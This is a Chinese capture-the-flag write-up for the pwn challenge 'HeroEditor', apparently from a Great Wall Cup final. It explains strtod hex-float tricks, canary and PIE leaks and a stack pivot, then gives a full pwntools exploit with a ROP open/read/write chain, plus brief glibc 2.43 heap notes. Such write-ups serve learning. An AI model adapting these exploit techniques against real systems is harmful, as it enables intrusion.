---
title: 第三届长城杯CCB总决赛 Pwn HeroEditor复现WP
published: 2026-05-02
tags: [WriteUp, Pwn]
category: CTF
draft: false
---

第一次打长城杯决赛，喜提参与奖

感觉今年的题比去年的难……Pwn总共有7题，有4个全场零解（为什么Pwn占比这么大？）

# HeroEditor (4解)

## strtod

开幕雷击，搞半天不知道怎么得到想要的数字

检查0: 输入字符串不能含有`x`

把输入字符串用`strtod`转换为`double`，再用`sprintf %ld`得到新字符串

检查1: 输入字符串和新字符串不能含有相同字符

检查2: 输入字符串不能是普通的十六进制整数

这里需要知道`strtod`的特殊用法

### 特殊值

非数：`NaN`, `NaN(1234)`

无穷大：`Inf`, `Infinity` （大小写不敏感）

### 十进制浮点数

`[whitespace] [+-] <digits> [. <digits>] [e/E [+-] <digits>]`

例如`-123.456e-2` -> `-1.234560`

### 十六进制浮点数

`0[xX] hex-digits [. hex-digits] [p[+-] decimal-exponent]`

- 以 0x 或 0X 开头（大小写均可）。

- 接着是一串十六进制数字（0-9 和 a-f / A-F），代表有效数字部分。

- 可选的小数点 . 可放在有效数字的任何位置。

- 最后必须跟一个二进制指数部分：p 或 P，后面是一个十进制整数（可带正负号），表示 乘以 2 的多少次幂。

> 注意：指数是以 2 为底，而不是 10。这与十进制浮点常量 (e/E) 完全不同。

`strtod` 会按以下方式计算十六进制浮点数的数值：

将有效数字（忽略前缀 0x/0X 和 p/P）解析为一个十六进制整数或分数。
例如 0x4 就是 4；0x1.8 是 1 + 8/16 = 1.5；0xA.4 是 10 + 4/16 = 10.25。

这个有理数再乘以 2^exponent，得到最终的 double 值。
例如 0x4p5 = 4 × 2^5 = 4 × 32 = 128。
0x1.8p3 = 1.5 × 2^3 = 1.5 × 8 = 12.0。

该格式可以精确表示任何二进制浮点数，而且没有十进制浮点常量的舍入误差，常用于需要精准位表示的场合。

## 泄露

0X0.5p2 -> 1

0X1.7p5 -> 46

0X1.Dp7 -> 0xE8

0X4p5 -> 0x80

免费送的栈溢出写(0XE8)和读(0x30)，然而过滤了任何libc地址和栈地址，只能泄露PIE和Canary（当最高字节和次最高字节都为零，且第三高字节大于 0x6F 时过滤）

大部分函数结束时有`_cyg_profile_func_exit`，检查`rsp`还在不在`0x7F0000000000`~`0x800000000000`，且清空所有无关寄存器（主要是`rdi` `rsi`），导致无法完整栈迁移，也不能利用残留寄存器值

（赛场上卡在这了）

此时应该观察一下其他函数，发现打印菜单函数和功能2函数没有`_cyg_profile_func_exit`，而且以`pop rbp ; ret`返回

调试发现调用`printf`后，`rdi`是一个栈地址且指向另一个栈地址，此时跳到`puts`就可以泄露栈地址

之后伪造`sub_142A`的栈帧，从中间进绕过过滤泄露libc基址，构造一下栈迁移，读orw链

## exp


```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './game'
elf = ELF(file)
libc = ELF('./libc.so.6')

choice = 0
if choice:
    port =   0
    target = ''
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
n2b     = lambda x                  :str(x).encode()

def send_double(content):
    sl(content.ljust(8, b'\x00'))

def menu1():
    ru(b'> ')
    send_double(b'0X0.5p2')

# debug('''
#       brva 0x14A2
#       brva 0x14C8
#       ''')

# debug('''
#       brva 0x204E
#       ''')

menu1()

ru(b'Draft size: ')
send_double(b'0X0.5p2') # 1

ru(b'Write your draft:\n')
s(b'A')

ru(b'Preview bytes: ')
send_double(b'0X1.7p5') # 46

ru(b'Archive preview:\n')
r(8)
r(8)
r(8)
canary = u64(r(8))
leak('canary')
r(8)
elf.address = pie = uu64(r(6)) - 0x21bd
leak('pie')
bss = elf.bss(0x800)

menu1()
ru(b'Draft size: ')
send_double(b'0X1.Dp7') # 0xE8
ru(b'Write your draft:\n')
payload = flat([0, 0, 0, canary, bss, pie + 0x19FB, pie + 0x215E, bss, pie + 0x1F8D])
s(payload.ljust(0xE8, b'\x00'))

ru(b'Preview bytes: ')
send_double(b'0')

ru(b'> ')
stack = uu64(r(6)) + 0x1d8 + 0x30
leak('stack')


ru(b'Draft size: ')
# send_double(b'0X1.Dp7') # 0xE8
send_double(b'0X4p5') # 0x80
ru(b'Write your draft:\n')
payload = flat([0, 0, 0, canary, stack, pie + 0x14AD, 
                0, stack, 0, 0x100, 0, 0,
                stack, pie + 0x1F8E])
s(payload.ljust(0x80, b'A'))

ru(b'Preview bytes: ')
send_double(b'0')

ru(b'The scribes seal the draft.\n')
r(0x78)
libc.address = uu64(r(6)) - (libc.sym['__libc_start_main'] + 139)
leak('libc.address')

rdi = libc.address + 0x10f78b
rsi = libc.address + 0x110a7d
rbx = libc.address + 0x0586e4
rdx = libc.address + 0x0b0153  # 0x00000000000b0153 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret


ru(b'Draft size: ')
send_double(b'0X1.Dp7') # 0xE8
ru(b'Write your draft:\n')
payload = flat([0, 0, 0, canary, stack,
                rsi, stack + 0x60,
                rbx, 0x200,
                rdx, 0, 0, 0, libc.sym['read']])
s(payload.ljust(0xE8, b'\x00'))

ru(b'Preview bytes: ')
send_double(b'0')

pause()

payload = flat([
    rdi, stack + 0x60 + 0x100, rsi, 0, libc.sym['open'],
    rdi, 3, rsi, stack + 0x60 + 0x200, rbx, 0x50, rdx, 0, 0, 0, libc.sym['read'],
    rdi, 1, rsi, stack + 0x60 + 0x200, rbx, 0x50, rdx, 0, 0, 0, libc.sym['write']
])

s(payload.ljust(0x100, b'\x00') + b'/flag\x00')



itr()
```


# CreditMarket（11解）

glibc 2.43堆题，64字节堆溢出，主要是用到了一些新版本特性

- 2.41: `calloc`会从`tcache`里申请
- 2.42: 修复所有的`largebin attack`
- 2.43: `tcache_perthread_struct`初始化推迟到第一次`tcache free`
- `tcache_perthread_struct`的计数器改为`tcache`的剩余容量，从16开始减

另外改小`top chunk`的间接free似乎也有变化，满足`smallbin`大小时先进`smallbin`而不是`tcache`

详细wp偷懒不写了